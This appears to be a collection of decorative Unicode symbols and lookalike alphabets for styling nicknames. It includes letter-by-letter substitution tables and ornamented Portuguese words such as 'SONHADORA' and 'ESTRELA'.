\u0FD3 \u0FD7 ᩎ ᩗ ᪘ \u1AA5 ᬻ \u2638 \u2661 \u269A \u26B5 \n\nଃౄ ృೋ ೊ ೈ\n\n\xA0 \u0488. \xA0\u06DD \u06DE ۵ \u07F7 ि ॏ ऻ ৎৣ \n\nꔼ ꔶ ꔵ ꕥ ꖄ ꗥ ॏৎৣ\nれ \u20A1 \u20A9 \u20A4 \u20A6 \u20B1 \u20B2 \u20B0 \u20B3 \u20B7 \u20B8 \u20B9 ℐ ℑ ℒ ℊ ℋ ℌ ℍす や \u2F33 ひ ቻ ঊ ֆ \u2118 ℙ ℚ ℛ ℜ ℝ \u2123 ℤ ℬ ℰ ℭ ℱ ℳ ⅅ ⅆ\xA0 Ǥ 㞩 ↁ Ҩ む ⷀ \u20A6 み ↁ \u060F 亇 ℭ \n\u274Dｷ Ⱥ 多 及 Δ̸ 弋\xA0 ៩ ൬̸ 岌 \u20AE ቾ ℴ\n\n๖ۣۜ\u20AC ๖ۣۜ@ \n๖ۣۜA ๖ۣۜB ๖ۣۜC ๖ۣۜD ๖ۣۜE ๖ۣۜF ๖ۣۜG ๖ۣۜH ๖ۣۜI ๖ۣۜJ ๖ۣۜK ๖ۣۜL ๖ۣۜM ๖ۣۜN ๖ۣۜO ๖ۣۜP ๖ۣۜQ ๖ۣۜR ๖ۣۜS ๖ۣۜT ๖ۣۜU ๖ۣۜW ๖ۣۜV ๖ۣۜX ๖ۣۜY ๖ۣۜZ\nE\nA\u0488 B\u0488 C\u0488 D\u0488 E\u0488 F\u0488 G\u0488 H\u0488 I\u0488 J\u0488 K\u0488 L\u0488 M\u0488 N\u0488 O\u0488 P\u0488 Q\u0488 R\u0488 S\u0488\xA0\xA0 \u0488\xA0 U\u0488 V\u0488 W\u0488 X\u0488 Y\u0488 Z\u0488\nS\u0488O\u0488N\u0488H\u0488A\u0488D\u0488O\u0488R\u0488A\u0488 \nA\u0489 B\u0489 C\u0489 D\u0489 E\u0489 C\u0489 D\u0489 E\u0489 F\u0489 G\u0489H\u0489 I\u0489 J\u0489 K\u0489 L\u0489 M\u0489 N\u0489 O\u0489 P\u0489 Q\u0489 R\u0489 S\u0489 T\u0489 U\u0489 V\u0489 W\u0489 X\u0489 Y\u0489 Z\u0489\n\n丹 乃 匚 刀 モ 下 ム 卄 工 Ｊ Ｋ ㄥ 爪 れ 口 ㄗ Ｑ 尺 ち 匕 \u222A \u2228 山 メ ㄚ 乙v ๖ۣۜÄ ๖ۣۜÖ ๖ۣۜÜ\n\n๖ۣۜۜ͜͡ஓீ͜ ۣۜ\xA0\xA0\xA0 ፝͡ৎ\u271E̤֟\u066D\xA0 ৎ\u2765̤֟\u066D ΔΜƗŽΔĐ\u20ACৎ̤\u2719֟\u066D\xA0 ஓீۣ̤֟͜\u066D̤֟ ঔ\xA0 ፝͡ৎ\u2745̤֟\u066D\xA0\xA0 ፝͡ৎ\u271E̤֟\u066D\xA0 \u2E0E\u271E\n\u2727\n\u2661\xA0 ৎ\u2765̤֟\u066Dۣۜ ஓீ፝͜͡\xA0S\u0488O\u0488N\u0488H\u0488A\u0488D\u0488O\u0488R\u0488A\u0488ৎ\u273F̤֟\u066D \xA0 \u2726ۣۜۜ\u2606ۜۜ͜͡\xA0\xA0 ঔৣֳ᷌᷈͜͡\u2740 ్మాై\xA0 ू ፝͜\u2765 ೈ፝͜͡๖ۣۜ\xA0\xA0 ৎ\u273F̤֟\u066D ೈ፝\n\n\u2726\u0488͜͡\u27B3 ீ͜ৡৢ͜͡\xA0\xA0 ๖ۣۜۜ͜͡ீ͜\xA0\xA0 ೈ፝͜͡\xA0\xA0\xA0 ঔৣ͜͡\xA0\u2727\xA0 ৢۜ͜͡\u271F ঔৣ͜͡ீ͜\u2765͜ঔৣ\nลѦคᎯสﾛꍏ开ਸ\uD83C\uDE37 \n\n\uD83C\uDDE7乃вβƁദЂß\u0E3FႪЬҍცɮɞᏰᕊℬᙖ侈\n\n\uD83C\uDDE8匚\xA2ḉ\u20A1ე\u20B5ႠƇꉓᏣᑕℂとͼℭ\n\n\uD83C\uDDE9刀\u2202ÐↁƊժ\u2285ԃԂꀸᖱᎴᖙᗪᗬ\n\n\uD83C\uDDEAモєΣعэㄠპ\u212E\u2208\u2211ξϵﾓ౬ꍟᏋᙓℰ\u326B ૯を\n\n\uD83C\uDDEB下f\u20A3ҒՔ౯Բヂբꎇℱ Բ\n\n\uD83C\uDDECムg\u2761Ⴚ\u20B2ʛｇꁅℊᎶᏩԌੲǤ\n\n\uD83C\uDDED卄нஅअĦዠせけみんჩℋℍザਮ\u2645ℌ\n\n\uD83C\uDDEE工ιΞ\u1364ቾ์łⱡ\u17DB\u1363เቖェエＩใ ɪꀤᏐⅈɨ \xA1\n\n\uD83C\uDDEFCD\u20ADҝƘӃꀘᏦҡ \n\n\uD83C\uDDF1ㄥℓ ŁﾚⱠⱢ\u2220\u20BAし८ไ\u20B0Լ廴\uA492ℒむもꞭ\n\n\uD83C\uDDF2爪м๓றℳო\u0BF1൬ლຕឮᙢᗰϻ从\n\n\uD83C\uDDF3れиภฑரƝห\u20AA\u20A6Ⴖல\u2229ຖหℕᏁग़ͷη\n\n\uD83C\uDDF4口σѻØᘎø\u0E4FΘФӨのѺ\u274DΩҩᎧҨᏫᎤԾ \u2742\n\n\uD83C\uDDF5ㄗρㄕ ƤPᎵᕈթア\u20B1や\u2118ԹｱヱᖘᎮ 伊\n\n\uD83C\uDDF6Ｑqℚ \n\n\uD83C\uDDF7尺яरℜरै\u20B9 ԄƦʀꋪ\u2742\nԻᖇℛℝᏒ\u2608尻\n\n\uD83C\uDDF8丂s\uD83D\uDCB2Şڪşک\u20B7នঊՖᎦฐຮꌗऽธ\n\n\uD83C\uDDF9匕тτŦƬ\u2020\u20AE\u09F3Ⴕ\u20B8すｲ イकԵ\uA4C4ནᅮ\u2533\u2213\u2628Ꭲ\n\n\uD83C\uDDFA\u222AυยひปႮখʊƲ\u222AนบฆնບນꀎᏌᏠथ໓\n\n\uD83C\uDDFB\u2228νƔ۷ɣᐯᏉᏤ\n\n\uD83C\uDDFC山ωwฬ\u20A9Ꮃ\u0BF0ຟฝѠШพผฟຜຝᙡਘ\n\n\uD83C\uDDFDメ\u2717\u2718\u2716Ж\xD7ꊼ艾 \n\n\uD83C\uDDFEㄚуΥﭏצּҰ\xA5УұץჄყעꌩ\u2442Ꭹϒ\n\n\uD83C\uDDFF乙zƵƶʑẕꁴᏃℤ\n\nA=Δ\uA670 Λ λ Ⱥ \u20B3 ą å ส สั ล α ค ศ Ⴉ \uD83C\uDDE6 \uD83C\uDDE6ศ \u20B3 ﾑΔ a ɑ Ă 厾 λ α Λ ɐ ส丹\u24D0 Д \u2206 ਸ λ Λ ą å ส ล ค α Ą ਜ Ẵ ศ ά āλ Д Å ä ล Ẳ Ħ ª ẩ ส Ä ձ Ą ๖ۣۜĄ αสั ά ặ\nम स 禸 丒丸凡 丹入 ﾑ ム Д 开 ໞ Ѧ 月么 ਜ a\u0489 岚 ๖ۣۜa ꬍꬅ 刄 㞩\n\nв=多\uD83C\uDDE7 乃 ঔৣ͜͡岌 в \u0E3F ß β ც\u24D1 ხ ɮ β ß \u0E3F Ъ طß в β ხ \u0E3F в \u2422 ๒ Ъ ъ ь Ɓ ß \u0E3F Þ 乃 邦 ぶ \u2707 及 в Ⴊ \uD83C\uDDE7 ๖ۣۜв 夃 ଷ\nゐßѢƀЪЬβϐбБъьわゎらね \u266D ɓ в\u0489 ㄢ \n\nc=\xA2 \u20A1 \u20A2 c ς \u2282 匚 ㄷ ど に 二仁 \uD83C\uDDE8 ɕ ૮ c\u0489 ๖ۣۜc Շ \uD83C\uDDE8 \xA2 \u20A1 ᄃ c̈̈ ɔ ς \xA9c\xA2 ς \xA9 ζ Ƈ Ɔ ʗ \u20A1 ૮ ح\xA2 Ĉ č Č \xA9 ĉ Ć ૮\n\nd=ↁ Đ ɗ đ δ ɖ わ 力 \u2283̸ \u2285໓ \uD83C\uDDE9 \u220C d\u0489 刀 Ɗ\n๖ۣۜd ಖ \uD83C\uDDE9đ Đ ɖ \u24D3 \u2202 ժÐ \u2202 đ ۜÐ \u20ABÐ \u2202 ð đ ๔ მ ძ ժ ɗ \n\ne=Ɇ \u20AC \u212E \u326B \u2209 \u2208 Ξ Σ ξ Є ๋Є ع ə ɇ є ჲ を\nﾐ ﾓ 三 巨 玄乞 Ｅ它 ೯ ౯ ㄠ モ \uD83C\uDDEA e\u0489 亥 ૯ ๖ۣۜe も ƎƏ Ɛ \u060F៩ \uD83C\uDDEA 乇 Є є Σ ε ξ \u24D4 玄 ៩ \u20A4 ჰ პ\u212E\xA3 Є ξ Є๋ є ჱ ŧ Σ ε ع э έ נּ גּ ɛ ə ٤ ૯૯ є პ ε Ë ع ﻊ ē \u20AC ξ έ \u212E ë Э ۼ\n\nғ=Ғ ƒ Բ下 ﾁ Ϝ ғヂ Ք ғ 下 \uD83C\uDDEB ғ\u0489. ๖ۣۜғ  \uD83C\uDDEB ｷ \u20A3 ʃ ғ \u24D5 ғ Ғƒ Բ ๖ۣۜғ \u20A3ƒ \u20A3 ﬄ ךּ דּ Ғ ક \n\ng=\u20B2 ǥ Ⴚ Ǥ \u2761 ሬ \uD83C\uDDEC Ԍ g\u0489 ๖ۣۜg ໔ ໕ ផ \u0BF9\n\uD83C\uDDEC Ĝ Ģ g g̈̈ \u24D6 \u20B2 \u0BF9 ğ g๋ ๔ Ġ ġ ģ ğ๋ ؤ و פĢ \u20A2 ɠ ૬ ǥ\n\nн=Ħ ん ɧ 卄௮ அ ஆ Һ һ н Ҕ ҕ Ң ң Ҥҥ Ӈ ӈ Ԋ ԋ 艹 Ⴌ \uD83C\uDDED \u2560\u2563 н み ђ ๖ۣۜн ਮ \uD83C\uDDED ん ħ н ђ அ ჩ ħ \u2560\u2563 ђ સ Њ ௮ Ћ нસ அ ħ ђ н Ћ Њ अ\u2560\u2563\n\nι=\u1364 ɨ \u17DB í \u2223 ழェ エ ｪ ｴ 工讠 辶 เ ቾ \uD83C\uDDEE \u0489 ι\u0489 \n๖ۣۜι ⶇⷀ \uD83C\uDDEE ί Ξ រ ł ιΐ ι \u2551ï Î เ Ī ﭑ Ỉ î Į ĩϊ ΐ ذ ﻐ ɩ ւ ɨ\n\nj=ʝĲ ｊ Ｊ ʲქ ჟ \uD83C\uDDEF j ℑ ๖ۣۜj \uD83C\uDDEFʝ ქ j Ĵ ɾ ე უل נ ਹ Ĵנ ل Ţ ړ ਹ ﻮ ʝ ჟ\n\nĸ=Ҝ Ҟ Ӄ \u20AD Ҝ 长 ҟ Ҡ ҡ ӄ ҝ  \uD83C\uDDF0 Ƙ ĸ ઝ ๖ۣۜĸ\uD83C\uDDF0 \u20AD Ҝ κ ķ К к ๖ۣۜĸ ઝ Қ ķ к Ҝ \u20AD К қ ҝ\n\nl=Ł Լ ℓ \u221F ﾚ し ̽ſ ʆ ไ \u20B0 \uD83C\uDDF1よ๊レ 廴 l\u0489 ㄥ ๖ۣۜl โ Ն \u20BA \uD83C\uDDF1 Ł \u20B0 ℓ Լ よ ℓ Ĺ Ł Լ Ľ Ļ Ŀ \u2518\xA3 ไŁ ℓ Ļ ๋\u255DԼ\n\nм=ℳ ๓ ற м რ ო ɱ \u20A5 Ӎ  ボ /v 水 ണ Ӎ \uD83C\uDDF2 м\u0489 爪 ๖ۣۜм\n\uD83C\uDDF2 м ℳ რ ற ო ɱ ๓ ʍ დლм ற /v ๓ ๖ۣۜм Щ๓ ற м \u20A5 რ ო ɱ\n\nn=\u20A6 Ń ņ ரŋИ ภй מ Ň หฑ иη\u2229 ல \u20AA ൯ Ŋ n\u0489 れ ๖ۣۜn ฌ ญ ൮ വശഷസ Л\uD83C\uDDF3и \u20A6 Π \u20AA η ெ வ йи η ŋ ฑ ர И ภ й Ń ņ ή п ห Ŋ ภ Պ ฑ η и ர Ɲ ห \u20AA ɳ מּ תּ \u20A6\n\no=Ѻ θ Θ \u274D \u25EF 〇Ծ\u0489 ゆ \u2205 Ø Ծ Օ ס \u2297 \u20B4 Θ ΦϕФ Ω θ๑ \u0E4F ο ๐ σ ø ѳ Ѻ Ѳ Ө ०\nの \uD83C\uDDF4 \u06DD o 口 ๖ۣۜo 汩 ଠ \uD83C\uDDF4Ø\u0E4Fσǿ\u2295ƠФץםץ\u20B4ΘԾøΩ\u274Dტიბθ\u2742 ø σ Ø ૭ Ǿ ö \u2642 ợ Ů Ơ Ō Ծ Θ δ Ǿ Ф Ộ Ö ǿ Ŏ ό Ø ѳ ø ૭ σ \u0E4F ơ Θ Ф ठ \u263B\u263A θ Ө ɵҨ\n\np=\u2118 \u20B1 了 ァ户 ㄕ尸 卩卫 ƿ ρ م թ ｱ ק \xB6 や ゃ ア マ ャ ヤ ヹ ｱ  \uD83C\uDDF5 伊 \u0489 p\u0489 ㄗ ๖ۣۜp 尹 \uD83C\uDDF5ρ ק թ þ φÞ \u2560\u255Dקּ թ φ þ քק Þ ρ p๋ \u203D ρ ƿ ք թ ॐ \n\nq=φ Ҩ ҩ. \uD83C\uDDF6 ϑ q\u0489 ๖ۣۜq\uD83C\uDDF6q ๖ۣۜqǪ ǫ գ\n\nr=ℜ Ԅ रै\u20B9Я 訳 尺 㞍尻尺 尼 尽 Ի ʀ ɾ я Я 民 \uD83C\uDDF7 r\u0489 屁 ૨ ๖ۣۜr ฯ ণ 尺 尻 я ℜ Γ я \xAE л Я Ř ř ર ŗ ѓ ל гг ŗ я \xAE Я Ŗ\n\nѕ= ฐ ร ຮ ธ ऽ \u20B7 ֆ ى ک উ ঊ Տ હ ៜ \uD83C\uDDF8 ട\n乌马 写 ㄅ ㄘㄎ 亐令 ѕ\u0489 Ｓ ๖ۣۜѕ ঙ ຣ ଌ \uD83C\uDDF8ঊ \u20B7 ន ѕ ร \u20B4 ஜى \xA7 ร ş ئ ટ ک Ŝ š હ Ş ઽ ՏȘ ร ﻜ \xA7 Ş ֆ હ $ Ș Ƨ ى ş Տ ડ ઽ ૐ \n\nт=\u2533  \u271E \u3012 Ԏ Ŧ \u20AE \u09F3 ॠ ŧ ჭ \u22A5 匕十 क़ 丁 も デ テ ナ ㄤ ｲ 亻 ট ゼ Ⴀ \uD83C\uDDF9\n平 亇 т\u0489 す ๖ۣۜт ক ፐ ፓ 弋 字 \uD83C\uDDF9т \u2020 է Ե ｲ Ŧ \u09F3ჯ \u20AE क も ł \u253C \u2020 т Ŧ Ţ Ť ŧ \u3036\u3012ł Ŧ \u2670 Ƭ τ \u2020 \n\nυ=น Ü บ ป ย ษ ข μ い ų น บ ป\u222A リ ㄩ凵びひ სυʉ \uD83C\uDDFA Ҵ ચ થ ს υ\u0489 む ષ ๖ۣۜυ Ⴎ ษ \uD83C\uDDFA ひ υ ს \u222Aચ µ Ü ü џ ů ย Û û ŭ ن น ષย џ ផ Ǔ Џ Ц Ū ப ʉ μ થ ય મ և υ ц\n\nv=\u221A 讠 \uD83C\uDDFB v\u0489 \u2228 ๖ۣۜv ง \uD83C\uDDFBν\u2207\u221A ૪\u221A ٧ ს\n\nw= \u20A9 ฬ ผ ฝ พ ฟ \u0BF0 ឃ ω \uD83C\uDDFC w\u0489 ખ 山 ๖ۣۜw ຟ \uD83C\uDDFC Ѡ Ш \u20A9 ωŴ ω ŵ ખ ώ ฬ ฝ พ ฟ ﷲ ਘ\n\nх =\xD7 区\xD7义冈区囟ҳ̸Ҳ̸ҳ\u2718\u2717 χ \uD83C\uDDFD 乂 х\u0489. メ ๖ۣۜх \uD83C\uDDFDχ Ҳ ҳ \u2716χ Ж ჯ \xD7א ﭏ Ҳ ҳ χ \xD7\n\ny = ƴ \xA5 丫吖 Ɏ Ύ Ⴘ 쏘 γ צ ყ Ⴘ Ⴗ ע γ у y ﻻ ㄚ Ⴤ \uD83C\uDDFE ψ Ψ y\u0489. ๖ۣۜy \u2F2C Ƴ\uD83C\uDDFEу Ψ ყ γμ\xA5 ﻻ ŷ Ў ყ γ ÿ ý ५У ყ ﻻ צּ Ұ \xA5 У ұ ץ\n\nΖั = ʑ Ӡ ӡ ろ る 乙 之 z ƶ ȥ ʒ ʐ ʑ ƺ ʓ \uD83C\uDDFF z\u0489 \uD83C\uDDFF z 乙 ζ Հ Ż ž ζ ż Ƶ Հ ƶ ƺ\n\nᵃ ᵇ ᶜ ᵈ ᵉ ᶠ ᵍ ʰ ᶤ ʲ ᵏ ˡ ᵐ ᶰ ᵒ ᵖ ˁ ʳ ˢ ᵗ ᵘ ᵛ ʷ ˣ ʸ ᶻ ᵈˡᶜ ᶤ ᶫᵒᵛᵉ ʸᵒᵘ\n\nᴬ ᴮ \u055F ᴰ ᴱ ˁ ᴳ ᴴ ᴵ ᴶ ᴷ ᴸ ᴹ ᴺ ᴼ ᴾ ᵠ ᴿ \u2075 ᵀ ᵁ ᵛ ᵂ ᵡ ᵞ ᶻ\n\n\u2070 \xB9 \xB2 \xB3 \u2074 \u2075 \u2076 \u2077 \u2078 \u2079\n\n就像模像ા િ ી ુ ૂ ૃ ૄ ૅ ે ૈ ૉ \u20A1\u20A2\u20A3\u20A4\u20A5\u20A6\u20A9\u20AA\u20AB\u20AD\u20AF\u20BE\u20BD\u20BB\u20BA\u20B8\u20B7\u20B6\u20B6\u20B5\u20B4\u20B4\u20B2\u20B0\u20B1\u20B3\u2E3F\u2E1A\u2E1Bⶬ\u2EDE\u2E19ㆃ㑹䡤 \u2592\u2591\u2593 \u0489 \u0488 ℳℴℵ\u2125ℤℨ\u2118ℜ\n\u2654\u2655\u2656\u2656\u2657\u2658\u265A\u265D\u265F\u2660\u2662\u2662\u2663\u2664\u2666\u2668\u2680\u2682\u2683\u2685\u2767\u2765\u2765\u2764 ๖ۣۜ͡ஓீ͜͡ι\n\u2763\u2760\u2760\u2751\u2752\u2741\u2743\u2745\u2754\u2754\u2756\u2746\u2747\u2748\u2759\u2759\u274B\u275C\u275D\u275E\u274F\u274E\u274D\u274C\u274A\u274A\u2749\u2748\u2747\u2745\u2744\u2742\u2740\u2740\u2730\u2731\u2733\u2733\u2734\u2735\u2737\u2737\u2738\u2739\u273A\u273B\u273C\u273D\u273F\u272F\u272E\u272B\u272B\u272A\u2727\u21DD͜͡Σsէ૨Σረለ\u272B\u272B\u271F.\u2726\u2725\u2724\u2724\u2723\u2722\u2721\u2721\u2720\u271F\u271E\u271C\u271B\u271A\u2719\u2718\u2718\u2716\u2716\u2717\u2715\u2714\u2713\u2712\u2711\u270D\u270E\u270F ೈ፝͜͡ ঔৣ͜͡\u27B3 \u21DD\u2766ۜ\u272Fۣۜৡৡۣۜ\u272Fۜ\u2766\u21DC\uA9C1\u1B7C\u2E3C\u271E\u2E3C\u1B7C\uA9C2 ঔৣ͜͡ீ͜\u2765͜ঔৣ\uD83D\uDC7C \u2E0E\u2734\u2022เั\u2022\u2734\u2E0E ঔৣ͜͡\u27B3ೈ፝͜͡\u0FC7\u21ADৢۜ͜͡\u271F\u2717\u2719\u271A\u271B\u2720\u271F\u271E\u271C\u2722\u2726\u2727 \u2726\u272E\u272D\u272C\u272B\u272A\u2729\u272F\u2730\u273A\u2739\u2738\u2737\u2736\u2735\u2742\u2767\u2766 \u21DD\u2766ۜ\u272Fۣۜৡৡۣۜ\u272Fۜ\u2766\u21DC\uA9C1\u1B7C\u2E3C\u271E\u2E3C\u1B7C\uA9C2ঔৣ͜͡ீ͜\u2765͜ঔৣ\uD83D\uDC7C \u2E0E\u2734\u2022เั\u2022\u2734\u2E0E\uD83D\uDD34\u26AA\u26AB\n๖ۣۜۜ͜͡ஓீ͜ ۣۜ    ፝͡ৎ\u271E̤֟\u066D ৢۜ͜͡\u271F\u221Aɩτơ  ৎ\u2765̤֟\u066D  ৎ̤\u2719֟\u066D  ஓீۣ̤֟͜\u066D̤֟ ঔ  ፝͡ৎ\u2745̤֟\u066D   ፝͡ৎ\u271E̤֟\u066D  \u2E0E\u271E\n\n\u2665\uD83C\uDF43ஓீ፝͜\u2741̤֟ S\u0488\nஜ͜͜͡\u2661͜ৢ\u270D\uD83C\uDFFB\u2665\n\u2661  ৎ\u2765̤֟\u066Dۣۜ ஓீ፝͜͡   \u2726ۣۜۜ\u2606ۣۜۜ͜͡   ঔৣֳ᷌᷈͜͡\u2740 ్మాై  ू ፝͜\u2765S\u0488 ೈ፝͜͡๖ۣۜ   ৎ\u273F̤֟\u066D \n*ீ͜ৡৢ͜͡\u2726\u0488͜͡      \u0488͜͡\u2606ۣۜۜ͜͡  \u0488͜͡\u2606ۣۜۜ͜͡  \n\u2726\u0488͜͡\u27B3 ீ͜ৡৢ͜͡   ๖ۣۜۜ͜͡ீ͜   ೈ፝͜͡    ঔৣ͜͡   ৢۜ͜͡\u21DD͜͡Σsէ૨Σረለ\u271F. ঔৣ͜͡\xA0\u2727სɩτơર ঔৣ͜͡ீ͜\u2765͜ঔ   ፝͜͡\u0FC7\nれ \u20A1 \u20A9 \u20A4 \u20A6 \u20B1 \u20B2 \u20B0 \u20B3 \u20B7 \u20B8 \u20B9 ℐ ℑ ℒ ℊ ℌ ℍす や \u2F33 ひ ቻ ঊ ֆ \u2118 ℙ ℚ ℛ ℜ ℝ \u2123 ℤ ℬ ℰ ℭ ℱ ℳ ⅅ ⅆ  Ǥ 㞩 ↁ Ҩ むc ⷀ \u20A6 み ↁ \u060F 亇 ł \u274D\nｷ Ⱥ 多 及 Δ̸ 弋  ៩ ൬̸ 岌 \u20AE ቾ ℴ 玄 么 \u0E3F 令 它汩 ๖ۣۜЯ Ғ 平 Ұ \xA5 У 丹 ム ̸\u2285 Ɗ 乞 Σ ん 长 ไ \u20B0 Ɲ Θ Ø ៜ ゼ も 开 ᮈ\u06DEཹཷླྀ\xA0\xA0 ீ͜ஓீ͜\u0489͜͡\u2726S\u0488A\u0488D\u0488  G\u0488I\u0488R\u0488L\u0488  \n\u066D̤֟\u2740\n A\u0488 B\u0488 C\u0488 D\u0488 E\u0488 F\u0488 G\u0488 H\u0488 I\u0488 J\u0488 K\u0488 L\u0488 M\u0488 N\u0488 O\u0488 P\u0488 Q\u0488 R\u0488 S\u0488 T\u0488 U\u0488 V\u0488 W\u0488 X\u0488 Y\u0488 Z\u0488\n ूT\u0488R\u0488 A\u0488V\u0488 A\u0488D\u0488O\u0488R\u0488  \nA\u0489 B\u0489 C\u0489 D\u0489 E\u0489 C\u0489 D\u0489 E\u0489 F\u0489 G\u0489H\u0489 I\u0489 J\u0489 K\u0489 L\u0489 M\u0489 N\u0489 O\u0489 P\u0489 Q\u0489 R\u0489 S\u0489 T\u0489 U\u0489 V\u0489 W\u0489 X\u0489 Y\u0489 Z\u0489\nৡৢ͜͡\u2726\u0488͜͡   ፝͜\n O\u0488  M\u0488 E\u0488 L H\u0488    \n ℬ ℰ ℯ ℱ ℊ ℋ ℎ ℐ ℒ ℓ ℳ ℴ \u2118 ℛ \nℭ \u212E ℌ ℑ ℜ ℨ\n M\u0488EN\u0488O\u0488R\u0488    S\u0488O\u0488L\u0488I\u0488T\u0488A\u0488R\u0488I\u0488O\u0488     \nE\u0488S\u0488T\u0488R\u0488EL\u0488A\u0488\n    \n丹 乃 匚 刀 モ 下 ム 卄 工 Ｊ Ｋ ㄥ 爪 れ 口 ㄗ Ｑ 尺 ち 匕 \u222A \u2228 山 メ ㄚ 乙v ๖ۣۜÄ ๖ۣۜÖ ๖ۣۜÜ\n\n ๖ۣۜ\u20AC ๖ۣۜ@ Ju\n๖ۣۜA ๖ۣۜB ๖ۣۜC ๖ۣۜD ๖ۣۜE ๖ۣۜF ๖ۣۜG ๖ۣۜH ๖ۣۜI ๖ۣۜJ ๖ۣۜK ๖ۣۜL ๖ۣۜM ๖ۣۜN ๖ۣۜO ๖ۣۜP ๖ۣۜQ ๖ۣۜR ๖ۣۜS ๖ۣۜT ๖ۣۜU ๖ۣۜW ๖ۣۜV ๖ۣۜX ๖ۣۜY ๖ۣۜZ\n A = Д \u2206 ਸ λ Λ ą å ส ล ค α Ą ਜ Ẵ ศ ά ā\nB = ß в β ხ \u0E3F в \u2422 ๒ Ъ ъ ь\nC = \xA2 ς \xA9 ζ Ƈ Ɔ ʗ \u20A1 ૮ ح\nD = Ð \u2202 ð đ ๔ მ ძ ժ ɗ\nE = \xA3 Є ξ Є๋ є ჱ ŧ Σ ε ع э έ נּ גּ ɛ ə ٤ ૯\nF = ƒ \u20A3 ﬄ ךּ דּ Ғ ક Ք\nG = Ģ \u20A2 ɠ ૬ ǥ Ҩ ҩ\nH = સ அ ħ ђ н Ћ Њ अ\u2560\u2563\nI = ϊ ΐ ذ ﻐ\xA0 ɩ ւ ɨ\nJ = נ ل Ţ ړ ਹ ﻮ ʝ ჟ a\nK = Қ ķ к Ҝ \u20AD К қ ҝ\nL = Ł ℓ Ļ ๋\u255DԼ\nM = ๓ ற м \u20A5 რ ო ɱ\nN = Ŋ ภ Պ ฑ η и ர Ɲ ห \u20AA ɳ מּ תּ \u20A6\nO = Ø ѳ ø ૭ σ \u0E4F ơ Θ Ф ठ \u263B\u263A θ Ө ɵ\nP = ק Þ ρ P๋ \u203D ρ ƿ ք թ ॐ\nQ = Ǫ ǫ գ\nR = г ŗ я \xAE Я Ŗ ɾ\nS = Ș ร ﻜ \xA7 Ş ֆ હ $ Ș Ƨ ى ş Տ ડ ઽ ૐ\nT = ł Ŧ \u2670 Ƭ τ \u2020\nU = ย џ ચ Ǔ Џ Ц Ū ப ʉ μ થ ય મ և υ ц\nV = \u221A ٧ ს\nX = א ﭏ Ҳ ҳ χ \xD7\nZ = Ƶ Հ ƶ ƺ .\nY = У ყ ﻻ צּ Ұ \xA5 У ұ ץ\n\u262C.      ﻜςσяÞΐ૭η\nԻ.  \u221AɩτơԻ   ﻜςσяÞΐ૭η\nԻ\n\u262C\u22B9\u22B1 \u22B0\u22B9ஐﻬﻬஐ๑\u273A \uFE3E\uD81A\uDCD4\u22B0 \u22B1\uD81A\uDCD4\n\n꣰ ꣱꣢꣩ ꣨꣯ \uA95F ꦀꦃ ꦄ ꦂꦶꦵ ꦴ꦳ꦿ ꧀ \uD81A\uDE30 \uD81A\uDDE7 \uD81A\uDDD0 \uD81A\uDD5F \uD81A\uDD78 \uD81A\uDD53 \uD81A\uDD4A \uD81A\uDD07 \uD81A\uDD0Dსɩτơર\uD81A\uDD0D \uD81A\uDD1D \uD81A\uDD1B \uD81A\uDCF4 \uD81A\uDCF3 \uD81A\uDCD4 \uD81A\uDCD2 \uD81A\uDCD8 \uD81A\uDC7C \uD81A\uDC4E \u0FC7 \u0FC5 ᪔ ᪘ᬽ\u269E\u269F\u269C\u269B \u269D \u2695 \u26E7 \u2741 \u2766 \u2765 \u2E19\u2E0E \u2E19 ꕘ\uA670\uA673꣦꣭꣪\n\n\u0F12 \uA9C1\uA9C2   \u269A  \u269A\n\n\n\u0DF4 ේ \u0E5B ๖ ຂ \u0F12\u0F3B \u0F17\xA0\xA0 ཹ\xA0\xA0\xA0\xA0\xA0 ཷཱུུ.\xA0 \u0FD3 \u0FD7 ᩎ ᩗ ᪘ \u1AA5 ᬻ \u2638 \u2661 \u269A \u26B5 \n\nଃౄ ృೋ ೊ ೈ\n\n\xA0 \u0488. \xA0\u06DD \u06DE ۵ \u07F7 ि ॏ ऻ ৎৣ \n\nꔼ ꔶ ꔵ ꕥ ꖄ ꗥ ॏৎৣ\nれ \u20A1 \u20A9 \u20A4 \u20A6 \u20B1 \u20B2 \u20B0 \u20B3 \u20B7 \u20B8 \u20B9 ℐ ℑ ℒ ℊ ℋ ℌ ℍす や \u2F33 ひ ቻ ঊ ֆ \u2118 ℙ ℚ ℛ ℜ ℝ \u2123 ℤ ℬ ℰ ℭ ℱ ℳ ⅅ ⅆ\xA0 Ǥ 㞩 ↁ Ҩ む ⷀ \u20A6 み ↁ \u060F 亇 ℭ \n\u274Dｷ Ⱥ 多 及 Δ̸ 弋\xA0 ៩ ൬̸ 岌 \u20AE ቾ ℴ\n\n๖ۣۜ\u20AC ๖ۣۜ@ \n๖ۣۜA ๖ۣۜB ๖ۣۜC ๖ۣۜD ๖ۣۜE ๖ۣۜF ๖ۣۜG ๖ۣۜH ๖ۣۜI ๖ۣۜJ ๖ۣۜK ๖ۣۜL ๖ۣۜM ๖ۣۜN ๖ۣۜO ๖ۣۜP ๖ۣۜQ ๖ۣۜR ๖ۣۜS ๖ۣۜT ๖ۣۜU ๖ۣۜW ๖ۣۜV ๖ۣۜX ๖ۣۜY ๖ۣۜZ\nE\nA\u0488 B\u0488 C\u0488 D\u0488 E\u0488 F\u0488 G\u0488 H\u0488 I\u0488 J\u0488 K\u0488 L\u0488 M\u0488 N\u0488 O\u0488 P\u0488 Q\u0488 R\u0488 S\u0488\xA0\xA0 \u0488\xA0 U\u0488 V\u0488 W\u0488 X\u0488 Y\u0488 Z\u0488\nS\u0488O\u0488N\u0488H\u0488A\u0488D\u0488O\u0488R\u0488A\u0488 \nA\u0489 B\u0489 C\u0489 D\u0489 E\u0489 C\u0489 D\u0489 E\u0489 F\u0489 G\u0489H\u0489 I\u0489 J\u0489 K\u0489 L\u0489 M\u0489 N\u0489 O\u0489 P\u0489 Q\u0489 R\u0489 S\u0489 T\u0489 U\u0489 V\u0489 W\u0489 X\u0489 Y\u0489 Z\u0489\n\n丹 乃 匚 刀 モ 下 ム 卄 工 Ｊ Ｋ ㄥ 爪 れ 口 ㄗ Ｑ 尺 ち 匕 \u222A \u2228 山 メ ㄚ 乙v ๖ۣۜÄ ๖ۣۜÖ ๖ۣۜÜ\n\n๖ۣۜۜ͜͡ஓீ͜ ۣۜ\xA0\xA0\xA0 ፝͡ৎ\u271E̤֟\u066D\xA0 ৎ\u2765̤֟\u066D 